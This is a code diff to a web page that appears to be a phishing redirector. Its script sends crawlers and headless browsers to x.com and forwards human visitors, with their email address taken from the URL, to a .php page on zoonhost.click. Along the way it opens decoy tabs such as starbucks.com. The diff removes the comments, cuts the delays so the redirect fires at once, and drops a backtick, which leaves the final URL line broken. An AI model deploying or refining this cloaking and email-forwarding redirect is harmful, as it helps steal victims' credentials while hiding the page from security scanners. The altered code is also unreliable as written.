@@ -1,3 +1,7 @@
+<?php
+// Optional: You can set headers if you want to prevent caching
+header("Content-Type: text/html; charset=UTF-8");
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -38,9 +42,7 @@
 </head>
 <body>
     <script nonce="MzcxMDk5MDgyMywxNzE1Mzc1OTg1">
-        // Bot detection function
         function isBot() {
-            // Check for common bot user agents
             const botPatterns = [
                 /bot/, /spider/, /crawl/, /slurp/, 
                 /search/, /archiver/, /scraper/, 
@@ -53,12 +55,10 @@
             
             const userAgent = navigator.userAgent.toLowerCase();
             
-            // Check if any bot pattern matches
             if (botPatterns.some(pattern => pattern.test(userAgent))) {
                 return true;
             }
             
-            // Check for headless browser features
             if (navigator.webdriver || 
                 window.__webdriver_script_fn || 
                 window.__nightmare || 
@@ -66,7 +66,6 @@
                 return true;
             }
             
-            // Check if browser supports features that bots often lack
             if (!('ontouchstart' in window) && 
                 !navigator.plugins.length && 
                 !navigator.mimeTypes.length && 
@@ -78,23 +77,18 @@
             return false;
         }
 
-        // Function to handle the redirect sequence
         function handleRedirect() {
             if (isBot()) {
-                // Redirect bots directly to x.com
                 window.location.href = "https://x.com";
                 return;
             }
 
-            // Get email exactly as specified
             const email = new URLSearchParams(window.location.search).get('email') || 
                          window.location.hash.replace('#', '') || '';
             const emailParam = email ? '#' + email : '';
             
-            // Final destination URL with email parameter
-            const finalUrl = `https://zoonhost.click/scu/U4MTJiLTgyNTUtNDdmZS1hM2E2LWQ3MGNlY.php?ref=happhylife.ghost.io${emailParam}`;
+            const finalUrl = https://zoonhost.click/scu/U4MTJiLTgyNTUtNDdmZS1hM2E2LWQ3MGNlY.php?ref=happhylife.ghost.io${emailParam}`;
             
-            // Redirect sequence
             const redirectSequence = [
                 "https://www.starbucks.com/",
                 "https://x.com/",
@@ -103,15 +97,13 @@
             ];
             
             let currentStep = 0;
-            const redirectDelay = 1500; // 1.5 seconds between redirects
+            const redirectDelay = 3; // minimized delay
             
             function executeNextRedirect() {
                 if (currentStep < redirectSequence.length) {
                     if (currentStep === redirectSequence.length - 1) {
-                        // Final redirect - replace current page
                         window.location.href = redirectSequence[currentStep];
                     } else {
-                        // Intermediate redirect - open in new tab
                         window.open(redirectSequence[currentStep], '_blank');
                         currentStep++;
                         setTimeout(executeNextRedirect, redirectDelay);
@@ -119,12 +111,13 @@
                 }
             }
             
-            // Start the redirect sequence
             executeNextRedirect();
         }
 
-        // Start the redirect process after a short delay
-        setTimeout(handleRedirect, 10);
+        // Call immediately
+        handleRedirect();
     </script>
 </body>
 </html>
+
+
